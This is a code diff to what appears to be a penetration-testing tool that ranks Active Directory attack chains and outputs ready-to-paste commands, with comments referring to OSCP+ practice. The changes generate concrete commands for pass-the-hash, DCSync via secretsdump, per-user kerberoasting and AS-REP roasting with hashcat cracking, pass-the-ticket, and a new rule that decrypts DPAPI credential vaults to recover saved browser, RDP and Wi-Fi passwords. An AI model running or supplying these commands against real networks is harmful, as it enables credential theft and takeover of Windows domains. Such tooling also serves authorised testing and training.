@@ -353,10 +353,13 @@ def run(report, store, ui=None):
                        f"# LOCAL SAM hash - target the ORIGINATING host, not the DC")
         else:
             cmd_pth = f"netexec smb {tgt} -u '{u}' -H {h0}{more}"
+        # iter-24: drop literal '<DOMAIN>' when we've learned a real domain
+        # from BloodHound / NTDS / netexec_db; otherwise keep the placeholder.
+        _dom_r7 = store.dominant_domain() or "<DOMAIN>"
         chains.append(Chain("R7", "pass-the-hash", f"PtH -> {tgt}" + (f"  x{n} hashes" if n > 1 else f" ({u})"),
             crit=10, conf=0.85, ready=1.5, prox=best_prox,
             commands=[cmd_pth,
-                      (f"impacket-secretsdump -hashes :{h0} <DOMAIN>/'{u}'@{tgt} -just-dc   # if (Pwn3d!)"
+                      (f"impacket-secretsdump -hashes :{h0} {_dom_r7}/'{u}'@{tgt} -just-dc   # if (Pwn3d!)"
                        if not local_origin else
                        f"# DCSync NOT available with LOCAL SAM hashes; gather domain creds first")],
             src=src0, line=ln0, count=n))
@@ -453,12 +456,20 @@ def run(report, store, ui=None):
             commands=[f"netexec smb {dc()} -u '<user>' -p '{label}'"],
             src=src0, line=ln0, count=len(occurrences)))
 
+    # iter-24: pick a concrete <DOMAIN> from the store so the operator
+    # pastes a working command, not '<DOMAIN>/<user>:<pass>'.
+    dom = store.dominant_domain() or "<DOMAIN>"
     # kerberoast. iter-13: prox honors DC presence so a known DC lifts the score
+    # iter-24: per-user '-request-user' form when we know the exact
+    # kerberoastable SPN owner (BloodHound hasspn). One command per user
+    # is the canonical OSCP+ pattern and lets the operator scope-creep
+    # only the user that actually has the SPN.
     for u in e.kerberoastable:
         chains.append(Chain("R9", "kerberoast", f"kerberoastable: {u}",
             crit=6, conf=0.8, ready=0.7, prox=max(0.7, _prox(store, dc())),
-            commands=[f"impacket-GetUserSPNs -request -dc-ip {dc()} <DOMAIN>/<user>:<pass>",
-                      "hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule"],
+            commands=[f"impacket-GetUserSPNs -request-user '{u}' -dc-ip {dc()} "
+                      f"{dom}/<owned-user>:<password>",
+                      f"hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule"],
             src="bloodhound"))
     if e.has_tgs:
         s, l = e.tgs_src
@@ -466,10 +477,15 @@ def run(report, store, ui=None):
             crit=4, conf=0.8, ready=0.7, prox=0.6,
             commands=["hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule"], src=s, line=l))
     # AS-REP. iter-13: prox honors DC presence
+    # iter-24: per-user form when target user is known (AS-REP doesn't need
+    # creds: -no-pass flag). With a single asreproastable user we don't
+    # need usersfile - just request that one user directly.
     for u in e.asreproastable:
         chains.append(Chain("R11", "AS-REP roast", f"AS-REP-able: {u}",
             crit=5, conf=0.8, ready=0.7, prox=max(0.7, _prox(store, dc())),
-            commands=[f"impacket-GetNPUsers <DOMAIN>/ -usersfile {ul or 'users.txt'} -dc-ip {dc()} -no-pass",
+            commands=[f"echo '{u}' > asrep_users.txt; "
+                      f"impacket-GetNPUsers {dom}/ -usersfile asrep_users.txt "
+                      f"-dc-ip {dc()} -no-pass -request -format hashcat | tee asrep.txt",
                       "hashcat -m 18200 asrep.txt rockyou.txt"], src="bloodhound"))
     if e.has_asrep:
         s, l = e.asrep_src
@@ -514,10 +530,11 @@ def run(report, store, ui=None):
     # to substitute - we cannot resolve IP -> FQDN passively.
     if e.has_ccache:
         s, l = e.ccache_src
+        _dom_r26 = store.dominant_domain() or "<DOMAIN>"
         chains.append(Chain("R26", "pass-the-ticket", "Kerberos ticket present",
             crit=6, conf=0.8, ready=1.4, prox=0.8,
             commands=[f"export KRB5CCNAME=<ticket.ccache>; "
-                      f"impacket-secretsdump -k -no-pass <DOMAIN>/<user>@<DC-FQDN>   "
+                      f"impacket-secretsdump -k -no-pass {_dom_r26}/<user>@<DC-FQDN>   "
                       f"# Kerberos: hostname MUST be the DC FQDN (SPN in ticket), not the IP {dc()}"],
             src=s, line=l))
     # shadow
@@ -526,6 +543,34 @@ def run(report, store, ui=None):
         chains.append(Chain("R21", "crack shadow", "Linux shadow hash present",
             crit=5, conf=0.8, ready=0.7, prox=0.6,
             commands=["unshadow passwd shadow > u; hashcat -m 1800 u rockyou.txt"], src=s, line=l))
+
+    # iter-24: R-DPAPI - pair a recovered masterkey sha1 (pypykatz / impacket
+    # output) with a Windows Credential vault file we've seen. With both,
+    # decryption is one impacket-dpapi command - no online prompt needed.
+    # Looks for masterkey via Evidence(kind='dpapi_mk', meta={sha1}) and
+    # Credential blob via INTERESTING FILES finding referencing /Credentials/<hex>.
+    dpapi_mks = [ev for ev in store.items if ev.kind == "dpapi_mk"
+                 and (ev.meta or {}).get("sha1")]
+    blob_paths = []
+    for f in report.findings:
+        det = (f.get("detail") or "")
+        src = f.get("file") or ""
+        if "Windows Credential vault" in det or "/Credentials/" in src or "\\Credentials\\" in src:
+            blob_paths.append((src, f.get("line")))
+    if dpapi_mks and blob_paths:
+        # Pair the first masterkey with each blob; operator runs once per blob
+        # and the right masterkey is whichever decrypts (impacket prints success).
+        mk = dpapi_mks[0]
+        sha1 = mk.meta["sha1"]
+        for bsrc, bln in blob_paths[:5]:    # cap at 5 to avoid spam
+            chains.append(Chain("R-DPAPI", "DPAPI masterkey + blob pair",
+                f"masterkey sha1={sha1[:16]}... + {os.path.basename(bsrc)}",
+                crit=8, conf=0.85, ready=1.5, prox=0.85,        # score 8.67
+                commands=[
+                    f"impacket-dpapi credential -key 0x{sha1} '{bsrc}'",
+                    f"# decrypted blob holds saved Chrome/RDP/Vault/Wifi creds; "
+                    f"feed any plaintext into spray (R1)",
+                ], src=bsrc, line=bln))
 
     # iter-23: ACL-edge chains.
     # When the operator owns ANY plaintext credential AND BloodHound reveals
